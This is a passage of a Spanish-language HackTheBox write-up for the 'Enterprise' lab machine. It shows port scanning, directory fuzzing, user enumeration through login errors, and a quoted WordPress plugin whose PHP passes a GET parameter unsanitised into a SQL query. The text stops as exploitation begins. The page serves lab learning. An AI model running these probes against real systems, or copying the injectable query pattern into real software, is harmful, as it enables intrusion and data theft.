@@ -1,0 +1,2593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Enterprise</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Enterprise | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Enterprise" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un ret2libc para obtener una /bin/sh en el host como root." />
+<meta property="og:description" content="Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un ret2libc para obtener una /bin/sh en el host como root." />
+<link rel="canonical" href="http://localhost:4000/htb/enterprise" />
+<meta property="og:url" content="http://localhost:4000/htb/enterprise" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-10T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" />
+<meta property="twitter:title" content="HackTheBox - Enterprise" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-05-10T00:00:00-07:00","datePublished":"2021-05-10T00:00:00-07:00","description":"Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un ret2libc para obtener una /bin/sh en el host como root.","headline":"HackTheBox - Enterprise","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/enterprise"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/enterprise"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Enterprise</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-05-10">10 May 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" alt="HackTheBox - Enterprise">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio, vamos a movernos entre sentencias <strong>SQL</strong> para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un <strong>buffer overflow</strong> mediante un <strong>ret2libc</strong> para obtener una <strong>/bin/sh</strong> en el host como <strong>root</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112enterpriseHTB.png" alt="112enterpriseHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/8308">MinatoTW</a>.</p>
+
+<p>Bueno, una locura esta vaina…</p>
+
+<p>Nos enfrentaremos a cositas web, en el puerto <strong>443</strong> encontraremos un archivo <code>.zip</code>, lo usaremos para encontrar un plugin vulnerable a <strong>inyección SQL</strong>, jugaremos demasiado con explotación manual, crearemos un script para extraer todas las bases de datos, tablas, columnas y data relacionada con ellas…</p>
+
+<p>Enumerando las tablas encontraremos usuarios, contraseñas (encriptadas y en texto plano) y un post oculto de <strong>WordPress</strong> con contraseñas, relacionando los puertos <strong>80 (WordPress)</strong> y <strong>8080 (Joomla)</strong> lograremos pasar los paneles login con credenciales válidas.</p>
+
+<p>Por parte de <strong>WordPress</strong> usaremos los plugins instalados para modificar su código <code>PHP</code> y entablarnos una reverse Shell. Haremos prácticamente lo mismo en <strong>Joomla</strong> para obtener una reverse Shell. Los dos servicios están corriendo en contenedores <strong>Docker</strong>.</p>
+
+<p>Dando vueltas nos daremos cuenta de que el contenedor que mantiene el servicio <strong>Joomla</strong> tiene una carpeta compartida con la máquina host, la carpeta compartida es la que encontramos en el puerto <strong>443</strong> (donde está el archivo comprimido), así que usaremos esto para crear un archivo <code>.php</code> (para que sea interpretado por la web) donde le indiquemos que nos genere una reverse Shell, en este caso obtendríamos una Shell en el servidor <strong>host</strong> <code>enterprise.htb</code> como el usuario <strong>www-data</strong>.</p>
+
+<p>Finalmente jugaremos con un servicio (también relacionado con el plugin que explotamos inicialmente), que nos daremos cuenta de que realmente es un binario ejecutándose en un puerto externo (<strong>32182</strong>), jugando con el binario veremos que en un punto se genera una sobrescritura de la memoria, por lo que escribimos partes que realmente no deberíamos escribir (<strong>Segmentation Fault</strong>), explotaremos este <strong>Buffer Overflow</strong> mediante la técnica llamada <strong>ret2libc</strong> para indicarle al servicio que nos genere una <code>sh</code> (Shell) como el usuario que ejecuta el proceso, en este caso como el usuario <strong>root</strong>.</p>
+
+<p>Estos son los scripts finales, en el post veremos la creación de ellos :)</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/ex_all.py">Script <strong>SQLi</strong> - extraemos tablas, columnas y data de cualquier base de datos</a>.</li>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/RCE_word_joom_host.py">Script <strong>RCE</strong> en los contenedores o en el host</a>.</li>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/exploitBOF.py">Script explotando <strong>Buffer Overflow</strong></a>.</li>
+</ul>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Bastante enumeración y a la vez bastante real, disfrutemos.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p><strong>al toke my rei, se viene muuuuuuuuuuuuuuuuucho pa leer.</strong></p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-wwwdata-doc-host">Movimiento lateral <strong>www-data (docker)</strong> -&gt; <strong>www-data (host)</strong></a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Listones, entonces empezemos validando que serviciones esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.61 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Tue May  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.61
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.61 ()    Status: Up
+Host: 10.10.10.61 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///, 8080/open/tcp//http-proxy///, 32812/open/tcp/////
+# Nmap done at Tue May  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 195.06 seconds
+</code></pre>
+
+<p>Tenemos estos servicios corriendo en estos puertos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong></td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong></td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td style="text-align: left"><strong><a href="https://sectigostore.com/blog/port-443-everything-you-need-to-know-about-https-443/">HTTPS</a></strong></td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td style="text-align: left"><strong><a href="https://www.watchguard.com/help/docs/help-center/es-419/Content/es-419/fireware/proxies/http/http_proxy_about_c.html">HTTP Proxy</a></strong></td>
+    </tr>
+    <tr>
+      <td>32812</td>
+      <td style="text-align: left">Desconocido</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Oko, ahora que tenemos conocimiento de los puertos abiertos y más o menos que contienen, apoyémonos de nuevo de <strong>nmap</strong> para hacer un escaneo de scripts conocidos y además identificar las versiones de cada servicio:</p>
+
+<p><strong>~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes</strong></p>
+
+<pre><code class="language-bash">❭ extractPorts initScan 
+
+[*] Extracting information...
+ 
+    [*] IP Address: 10.10.10.61
+    [*] Open ports: 22,80,443,8080,32812
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80,443,8080,32812 -sC -sV 10.10.10.61 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue May  4 25:25:25 2021 as: nmap -p 22,80,443,8080,32812 -sC -sV -oN portScan 10.10.10.61
+Nmap scan report for 10.10.10.61
+Host is up (0.19s latency).
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
+80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: USS Enterprise &amp;#8211; Ships Log
+443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+|_http-server-header: Apache/2.4.25 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: Joomla! - Open Source Content Management
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Home
+32812/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions: 
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|     Enter Bridge Access Code: 
+|     Invalid Code
+|     Terminating Console
+|   NULL: 
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|_    Enter Bridge Access Code:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port32812-TCP:V=7.80%I=7%D=5/4%Time=60916018%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,ED,"\n\x20...
+...
+...
+Unknown service, doesn't matter for now.
+(Además me estaba dando problemas para la busqueda :P)
+...
+...
+SF:minating\x20Console\n\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue May  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 39.93 seconds
+</code></pre>
+
+<p>Obtenemos estas versiones:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.4p1 Ubuntu 10</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.10</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Apache httpd 2.4.25</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8080</td>
+      <td style="text-align: left">HTTP Proxy</td>
+      <td style="text-align: left">Apache httpd 2.4.10</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">32812</td>
+      <td style="text-align: left">-</td>
+      <td style="text-align: left">Desconocido, pero parece un servidor web</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Varias cositas web, demosle antonce’ a ver por donde rompemos esta vaina ;)</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_without_etc.png" alt="112page80_without_etc" /></p>
+
+<p>Jmm, tenemos una página bastante linda, si vemos el código fuente tenemos referencias hacia el dominio <code>enterprise.htb</code>, así que agreguémoslo al archivo <code>/etc/hosts</code>, para que así cuando coloquemos el dominio en la web, nos resuelva como si estuviéramos conectándonos hacia la IP <strong>10.10.10.61</strong>.</p>
+
+<blockquote>
+  <p><a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">Más info del archivo <strong>/etc/hosts</strong></a>.</p>
+</blockquote>
+
+<p>So:</p>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.61   enterprise.htb
+...
+</code></pre>
+
+<p>Y ahora volviendo a probar en la web pero ahora contra el dominio:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_with_etc.png" alt="112page80_with_etc" /></p>
+
+<p>Ahora tenemos una página mucho más bonita :) Veamos que podemos destacar…</p>
+
+<p>En el código fuente vemos varias cosillas:</p>
+
+<ul>
+  <li><code>http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1</code>,
+    <ul>
+      <li>donde podemos interpretar que el servicio web está hecho sobre <a href="https://wordpress.com/es/">WordPress</a> (<code>wp-*</code>).</li>
+      <li>después podemos probar con los plugins que tenga instalado, ya que mucho son vulnerables…</li>
+    </ul>
+  </li>
+  <li><code>http://enterprise.htb/?p=57</code>,
+    <ul>
+      <li>podemos jugar con ese tipo de URL para fuzzear e intentar inyección de algo.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Si entramos a cualquier post vemos un usuario para guardar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_post51_foundUser.png" alt="112page80_post51_foundUser" /></p>
+
+<ul>
+  <li><strong>william.riker</strong>.</li>
+</ul>
+
+<p>Para validar si estamos sobre <strong>WordPress</strong> podemos apoyarnos de la extensión <strong>Wappalyzer</strong> y jugando con varias URL mantenidas por <strong>WP</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png" alt="112page80_wpAdmin" /></p>
+
+<p>Bien, tenemos el portal login por default de <strong>WordPress</strong> al redireccionarnos a <code>wp-admin/</code>. Jugando con <strong>Wappalyzer</strong> nos indica que estamos ante la versión <code>4.8.1</code> de <strong>WP</strong>, además nos indica la versión <strong>PHP</strong> (<code>5.6.31</code>) y que la base de datos usada es <strong>MySQL</strong>…</p>
+
+<p>Si colocamos el usuario <strong>william.riker</strong> en el campo <em>Username</em> con cualquier contraseña nos responde:</p>
+
+<blockquote>
+  <p><strong>ERROR:</strong> The password you entered for the username <strong>william.riker</strong> is incorrect. Lost your password?</p>
+</blockquote>
+
+<p>Si por el contrario colocamos otro usuario el cual pensemos que no exista, nos responde: <strong>ERROR: Invalid username. Lost your password?</strong>, asi que sabemos que el usuario <strong>william.riker</strong> es válido y existe ;)</p>
+
+<p>Jugando con bash intentamos ver que otros recursos están disponibles mediante un secuenciador de 1 a 200 ante la URL que habíamos encontrado antes que hacia referencia a los <strong>posts</strong>:</p>
+
+<pre><code class="language-bash">❭ for i in $(seq 1 200); do echo -n "Page $i: "; curl -s -I http://enterprise.htb/?p=$i | grep HTTP; done
+...
+Page 13: HTTP/1.1 301 Moved Permanently
+Page 14: HTTP/1.1 301 Moved Permanently
+Page 15: HTTP/1.1 301 Moved Permanently
+Page 16: HTTP/1.1 301 Moved Permanently
+...
+Page 23: HTTP/1.1 301 Moved Permanently
+Page 24: HTTP/1.1 301 Moved Permanently
+...
+Page 51: HTTP/1.1 200 OK
+...
+Page 53: HTTP/1.1 200 OK
+...
+Page 55: HTTP/1.1 200 OK
+...
+Page 57: HTTP/1.1 200 OK
+...
+Page 69: HTTP/1.1 200 OK
+...
+Page 71: HTTP/1.1 301 Moved Permanently
+...
+</code></pre>
+
+<p>Grepeando por titulo:</p>
+
+<pre><code class="language-bash">❭ for i in $(seq 1 100); do echo -n "Page $i - Status: "; curl -s -I http://enterprise.htb/?p=$i | grep "HTTP/1" | awk '{print $2}'; echo -n " Titulo: "; curl -s http://enterprise.htb/?p=$i | grep "&lt;title&gt;"; done
+</code></pre>
+
+<p>No vemos nada raro.</p>
+
+<p>Pero viendo cada uno en la web no hay nada relevante… Haciendo fuzzing tampoco encontramos nada, buscando vulnerabilidades relacionadas con <strong>WordPress 4.8.1</strong> y a <strong>Apache 2.4.10</strong> no vemos nada, asi que movámonos para otro puerto a vel khe.</p>
+
+<h3 id="puerto-443">Puerto 443 <a href="#puerto-443">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443.png" alt="112page443" /></p>
+
+<p>La página por default de <strong>Apache</strong>.</p>
+
+<p>Veamos si hay algo útil en el certificado SSL:</p>
+
+<pre><code class="language-bash">❭ openssl s_client -connect 10.10.10.61:443
+CONNECTED(00000003)
+...
+depth=0 C = UK, ST = United Federation of Planets, L = Earth, O = USS Enterprise, OU = Bridge, CN = enterprise.local, emailAddress = jeanlucpicard@enterprise.local
+...
+</code></pre>
+
+<p>Bien, entre toda la info que nos muestra el certificado, principalmente podemos rescatar un dominio (<code>enterprise.local</code>) y una dirección email (<code>jeanlucpicard@enterprise.local</code>) (de la que podemos extraer el usuario <strong>jeanlucpicard</strong>. Agreguémoslo por si algo.</p>
+
+<p>Si hacemos fuzzing encontramos un recurso llamativo:</p>
+
+<pre><code class="language-bash">❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt https://enterprise.htb/FUZZ  
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000012:   403        11 L     32 W       299 Ch      ".htpasswd"
+000000011:   403        11 L     32 W       299 Ch      ".htaccess"
+000000010:   403        11 L     32 W       294 Ch      ".hta"
+000001755:   301        9 L      28 W       318 Ch      "files"
+000002156:   200        375 L    964 W      10918 Ch    "index.html"
+000003660:   403        11 L     32 W       303 Ch      "server-status"
+
+</code></pre>
+
+<p>Tenemos la ruta <code>files</code>, si la visitamos obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443_files.png" alt="112page443_files" /></p>
+
+<p>Opa, un archivo <code>.zip</code>, pues descarguemoslo a ver que contiene…</p>
+
+<pre><code class="language-bash">❭ unzip lcars.zip 
+Archive:  lcars.zip
+  inflating: lcars/lcars_db.php
+  inflating: lcars/lcars_dbpost.php
+  inflating: lcars/lcars.php
+</code></pre>
+
+<p>Veamos cada uno de ellos:</p>
+
+<h5 id="lcarslcarsphp">lcars/lcars.php</h5>
+
+<pre><code class="language-php">&lt;?php
+/*
+*     Plugin Name: lcars
+*     Plugin URI: enterprise.htb
+*     Description: Library Computer Access And Retrieval System
+*     Author: Geordi La Forge
+*     Version: 0.2
+*     Author URI: enterprise.htb
+*                             */
+
+// Need to create the user interface. 
+// need to finsih the db interface
+// need to make it secure
+
+?&gt; 
+</code></pre>
+
+<p>Bien, nos informamos de un <strong>Plugin</strong> que aparentemente está siendo ejecutado por la máquina… Jugando con el puerto <strong>443</strong> y el puerto <strong>80</strong>, encontramos la ruta actual del <strong>Plugin</strong>, asi que vamos bien:</p>
+
+<pre><code class="language-bash">❭ curl -s -I http://enterprise.htb/wp-content/plugins/lcars/lcars.php
+HTTP/1.1 200 OK
+Date: Tue, 04 May 2021 25:25:25 GMT
+Server: Apache/2.4.10 (Debian)
+X-Powered-By: PHP/5.6.31
+Content-Type: text/html; charset=UTF-8
+</code></pre>
+
+<h5 id="lcarslcars_dbphp">lcars/lcars_db.php</h5>
+
+<pre><code class="language-php">&lt;?php
+include "/var/www/html/wp-config.php";
+$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+// Test the connection:
+if (mysqli_connect_errno()){
+    // Connection Error
+    exit("Couldn't connect to the database: ".mysqli_connect_error());
+}
+
+// test to retireve an ID
+if (isset($_GET['query'])){
+    $query = $_GET['query'];
+    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
+    $result = $db-&gt;query($sql);
+    echo $result;
+} else {
+    echo "Failed to read query";
+}
+
+?&gt; 
+</code></pre>
+
+<p>Opa, una conexión a la base de datos, pero lo interesante es que vemos como hace la petición ante ella al querer buscar el nombre del post (<code>post_name</code>) recibido mediante el parámetro <strong>GET</strong> <code>query</code>. Validemos:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
+Failed to read query
+</code></pre>
+
+<p>Perfecto, como vemos en el código, si la variable <code>query</code> está vacía, responde <strong>Failed to read query</strong>.</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=hola
+</code></pre>
+
+<p>Bien, hace la consulta a la base de datos, extrayendo el <strong>ID</strong> de la tabla <strong>wp_posts</strong> con respecto al nombre del post (en el anterior caso) llamado <strong>hola</strong>, como no existe, responde vacío. Esto nos da una idea fuerte de que debemos explotar una <strong>inyección SQL</strong> para leer usuarios o algo asi, veamos el otro archivo, pero ya tenemos algo para probar.</p>
+
+<h5 id="lcarslcars_dbpostphp">lcars/lcars_dbpost.php</h5>
+
+<pre><code class="language-php">&lt;?php
+include "/var/www/html/wp-config.php";
+$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+// Test the connection:
+if (mysqli_connect_errno()){
+    // Connection Error
+    exit("Couldn't connect to the database: ".mysqli_connect_error());
+}
+
+// test to retireve a post name
+if (isset($_GET['query'])){
+    $query = (int)$_GET['query'];
+    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
+    $result = $db-&gt;query($sql);
+    if ($result){
+        $row = $result-&gt;fetch_row();
+        if (isset($row[0])){
+            echo $row[0];
+        }
+    }
+} else {
+    echo "Failed to read query";
+}
+
+?&gt; 
+</code></pre>
+
+<p>De nuevo una consulta, solo que en este caso pasa el valor de <code>query</code> a <strong>entero</strong>. Extrae el titulo del post (<code>post_title</code>) de la tabla <code>wp_posts</code> donde ID será igual al valor de <code>query</code>.</p>
+
+<p>Veamos:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php
+Failed to read query
+</code></pre>
+
+<p>Y:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=1
+Hello world!
+❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=2
+ 
+❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=hola
+</code></pre>
+
+<p>Con esta consulta tambien podemos jugar a ver si podemos explotar alguna <strong>inyeccion SQL</strong>, a darle…</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Como vimos antes, si hacemos una consulta hacia el recurso <code>lcars_db.php</code> vemos:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=a
+ 
+</code></pre>
+
